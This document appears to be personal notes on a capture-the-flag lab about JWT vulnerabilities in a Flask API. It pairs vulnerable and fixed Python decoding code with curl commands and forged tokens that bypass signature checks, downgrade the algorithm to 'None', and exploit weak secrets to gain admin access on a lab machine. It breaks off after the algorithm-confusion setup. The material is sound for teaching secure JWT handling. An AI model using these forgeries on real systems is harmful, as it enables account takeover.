## The Rise of APIs

### 1. What are APIs and why they are popular

- **APIs (Application Programming Interfaces)** allow one backend to serve **multiple clients** (web apps, mobile apps, etc.).
- Business logic is **centralized** on the server and reused across platforms.
- From a **security perspective**, protecting one API protects all connected interfaces.

---
### 2. Session Management Problem with APIs

- Traditional **cookie-based authentication** works well in browsers but **not across different clients** (mobile apps, tools, scripts).
- APIs need a **client-agnostic** authentication method.
- This led to **token-based session management**.

---
### 3. Token-Based Session Management

- After login, the server sends a **token** instead of a cookie.
- The token is:
    - Stored on the **client side** (e.g., browser LocalStorage).
    - Manually attached to each request using headers.
- Common standard:
    - **JWT (JSON Web Token)**
    - Sent in header:

```
Authorization: Bearer <JWT>
```

Since cookies are not used, **developers control everything**, which can lead to **security mistakes** if not done properly.

---
### 4. API Project Overview

- The API is built using **Python Flask**.
- Each challenge uses the endpoint:
    `http://MACHINE_IP/api/v1.0/exampleX`
- `X` represents the example number.    

---
### 5. API Endpoints & Methods

- **POST request**
    - Used for authentication.
    - Sends credentials as JSON.
    - Returns a JWT token.
- **GET request**
    - Used to retrieve user details.
    - Requires a valid JWT in the Authorization header.

---

### 6. API Authentication Credentials

- Credentials are sent in JSON format:

```
{
  "username": "user",
  "password": "passwordX"
}
```
- `X` changes based on the example number.

---
### 7. cURL Usage

**Login (POST request):**

```
curl -H "Content-Type: application/json" \
-X POST \
-d '{ "username":"user", "password":"passwordX" }' \
http://MACHINE_IP/api/v1.0/exampleX
```

Access protected resource (GET request):

```
curl -H "Authorization: Bearer <JWT>" \
http://MACHINE_IP/api/v1.0/exampleX?username=Y
```
---
## JWTs (JSON Web Tokens)

### 1. What is a JWT

- **Self-contained token** used to securely transmit session information.
- **Open standard**: can be used by any developer or library.
- Can be verified without server-side session storage (stateless authentication).

---
### 2. JWT Structure

A JWT consists of **three Base64Url-encoded parts**, separated by dots:

1. **Header**
    - Contains the **token type** (usually JWT)
    - Contains the **signing algorithm** (e.g., HS256, RS256)
2. **Payload**
    - Contains **claims** (pieces of information about an entity)
    - **Registered claims**: predefined by the JWT standard
    - **Public & private claims**: defined by developers
3. **Signature**
    - Verifies token authenticity
    - Created using the **algorithm specified in the header**
    - Ensures payload and header are **not tampered with**

---
### 3. JWT Signing Algorithms

1. **None**
    - No signature
    - JWT claims cannot be verified
    - Not secure
2. **Symmetric (e.g., HS256)**
    - Uses **same secret key** for signing and verification
    - Signature = Hash(header + payload + secret)
    - All parties must know the secret
3. **Asymmetric (e.g., RS256)**
    - Uses **private key** to sign, **public key** to verify
    - Signature = Hash(header + payload) encrypted with private key
    - Verification possible by anyone with public key    

---
### 4. Security & Usage

- JWTs can also be **encrypted** (JWEs), but the **signature** is the main security feature.
- Enables **centralized authentication server**:
    - Server issues signed JWT
    - Client can use it on multiple applications
    - Each application verifies signature → trusts the claims
- JWTs are **stateless**: server doesn’t need to store sessions.

---
### Sensitive Information Disclosure

In PHP, for example, you can use $SESSION['var']=data to store a value associated with the user's session. These values are not exposed client-side and can therefore only be recovered server-side. However, with tokens, the claims are exposed as the entire JWT is sent client-side. If the same development practice is followed, sensitive information can be disclosed. Some examples are seen on real applications:

- Credential disclosure with the password hash, or even worse, the clear-text password being sent as a claim.
- Exposure of internal network information such as the private IP or hostname of the authentication server.

```
ajdev@rootbox:~$ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password1" }' http://10.49.170.207/api/v1.0/example1
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJwYXNzd29yZCI6InBhc3N3b3JkMSIsImFkbWluIjowLCJmbGFnIjoiVEhNezljYzAzOWNjLWQ4NWYtNDVkMS1hYzNiLTgxOGM4MzgzYTU2MH0ifQ.TkIH_A1zu1mu-zu6_9w_R4FUlYadkyjmXWyD5sqWd5U"
}

# all the sensitive information is in jwt:

{
  "username": "user",
  "password": "password1",
  "admin": 0,
  "flag": "THM{9cc039cc-d85f-45d1-ac3b-818c8383a560}"
}
```

---
### Signature validation Mistake

The second common mistake with JWTs is not correctly verifying the signature. If the signature isn't correctly verified, a threat actor may be able to forge a valid JWT token to gain access to another user's account. 

```
# The Development Mistake

payload = jwt.decode(token, options={'verify_signature': False})

# the fix

payload = jwt.decode(token, self.secret, algorithms="HS256")
```

```
ajdev@rootbox:~$ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://10.49.170.207/api/v1.0/example2
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4"
}

# manipulation the jwt
{
  "alg": "HS256",
  "typ": "JWT"
}

{
  "username": "admin",
  "admin": 1
}

ajdev@rootbox:~$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.SurGPm4eIK-v-gtvSzHAI6rEttfMA-2Q-Q2XyNFBAuM' http://10.49.170.207/api/v1.0/example2?username=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{6e32dca9-0d10-4156-a2d9-5e5c7000648a}"
}
```

---
### Downgrading to None

Another common issue is a signature algorithm downgrade. JWTs support the `None` signing algorithm, which effectively means that no signature is used with the JWT. While this may sound silly, the idea behind this in the standard was for server-to-server communication, where the signature of the JWT was verified in an upstream process. Therefore, the second server would not be required to verify the signature. However, suppose the developers do not lock in the signature algorithm or, at the very least, deny the `None` algorithm. In that case, you can simply change the algorithm specified in your JWT as `None`, which would then cause the library used for signature verification to always return true, thus allowing you again to forge any claims within your token.

**The Development Mistake**

```
Sometimes, developers want to ensure their implementation accepts several JWT signature verification algorithms.

header = jwt.get_unverified_header(token)

signature_algorithm = header['alg']

payload = jwt.decode(token, self.secret, algorithms=signature_algorithm)

However, when the threat actor specified `None` as the algorithm, signature verification is bypassed.[](https://pyjwt.readthedocs.io/en/stable/)
```

**The Fix**

```
If multiple signature algorithms should be supported, the supported algorithms should be supplied to the decode function as an array list, as shown below:

payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"])

username = payload['username']
flag = self.db_lookup(username, "flag")
```

```
ajdev@rootbox:~$ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password3" }' http://10.49.170.207/api/v1.0/example3
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8"
}

{
  "typ": "JWT",
  "alg": "None"
}

into base64: ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIk5vbmUiCn0=

then add this into the header

ajdev@rootbox:~$ curl -H 'Authorization: Bearer ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIk5vbmUiCn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.au6ZnN5a4PDwXOM-KMMkTxZDUOBWcOU3zCGzOD5Gb-s' http://10.49.170.207/api/v1.0/example3?username=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{fb9341e4-5823-475f-ae50-4f9a1a4489ba}"
}
```

---
### Weak Symmetric Secrets

If a symmetric signing algorithm is used, the security of the JWT relies on the strength and entropy of the secret used. If a weak secret is used, it may be possible to perform offline cracking to recover the secret. Once the secret value is known, you can again alter the claims in your JWT and recalculate a valid signature using the secret.

the development mistake: The issue occurs when a weak JWT secret is used. This can often occur when developers are in a hurry or copy code from examples.

the fix: A secure secret value should be selected. As this value will be used in software and not by humans, a long, random string should be used for the secret.

we can easily brutforce the secret key by using different seclist:

![[Pasted image 20260206080610.png]]

```
ajdev@rootbox:~$ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password4" }' http://10.49.170.207/api/v1.0/example4
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY"
}
ajdev@rootbox:~$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.R_W3WxiyPIyIaYxD-PCY8PzDxd_DQKNkIDu9_KyzLzU' http://10.49.170.207/api/v1.0/example4?username=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{e1679fef-df56-41cc-85e9-af1e0e12981b}"
}
```

---
### Signature Algorithm Confusion

An algorithm confusion attack happens when a JWT system incorrectly allows switching between asymmetric and symmetric signing algorithms. For example, an application expects tokens signed with RS256 (asymmetric: public/private key), but accepts a token claiming HS256 (symmetric: shared secret).

In vulnerable implementations, the JWT library may mistakenly use the public key as the HMAC secret when verifying an HS256 token. Since the public key is often publicly accessible, an attacker can use it as the secret key to forge a valid HS256 token with elevated privileges (e.g., admin access).

This results in signature validation bypass, even though the application believes the token is securely signed.

**The Development Mistake**

The mistake in this example is similar to that of example 3 but a bit more complex. While the None algorithm is disallowed, the key issue stems from both symmetric and asymmetric signature algorithms being allowed, as shown in the example below:

```
payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512", "RS256", "RS384", "RS512"])
```

Care should be given never to mix signature algorithms together as the secret parameter of the decode function can be confused between being a secret or a public key.

**The Fix**

While both types of signature algorithms can be allowed, a bit more logic is required to ensure that there is no confusion, as shown in the example below:

```
header = jwt.get_unverified_header(token)

algorithm = header['alg']
payload = ""

if "RS" in algorithm:
    payload = jwt.decode(token, self.public_key, algorithms=["RS256", "RS384", "RS512"])
elif "HS" in algorithm:
    payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"])

username = payload['username']
flag = self.db_lookup(username, "flag")
```

```
ajdev@rootbox:~$ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password5" }' http://10.49.170.207/api/v1.0/example5
{
  "public_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSoarRoLvgAk4O41RE0w6lj2e7TDTbFk62WvIdJFo/aSLX/x9oc3PDqJ0Qu1x06/8PubQbCSLfWUyM7Dk0+irzb/VpWAurSh+hUvqQCkHmH9mrWpMqs5/L+rluglPEPhFwdL5yWk5kS7rZMZz7YaoYXwI7Ug4Es4iYbf6+UV0sudGwc3HrQ5uGUfOpmixUO0ZgTUWnrfMUpy2dFbZp7puQS6T8b5EJPpLY+iojMb/rbPB34NrvJKU1F84tfvY8xtg3HndTNPyNWp7EOsujKZIxKF5/RdW+Qf9jjBMvsbjfCo0LiNVjpotiLPVuslsEWun+LogxR+fxLiUehSBb8ip",
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.kR4DjBkwFE9dzPNeiboHqkPhs52QQgaHcC2_UGCtJ3qo2uY-vANIC6qicdsfT37McWYauzm92xflspmSVvrvwXdC2DAL9blz3YRfUOcXJT03fVM7nGp8E7uWSBy9UESLQ6PBZ_c_dTUJhWg35K3d8Jao2czC0JGN3EQxhcCGtxJ1R7T9tzBMaqW-IRXfTCq3BOxVVF66ePEfvG7gdyjAnWrQFktRBIhU4LoYwem3UZ7PolFf0v2i6jpnRJzMpqd2c9oMHOjhCZpy_yJNl-1F_UBbAF1L-pn6SHBOFdIFt_IasJDVPr1Ybv75M26o8OBwUJ1KK_rwX41y5BCNGcks9Q"
}


```
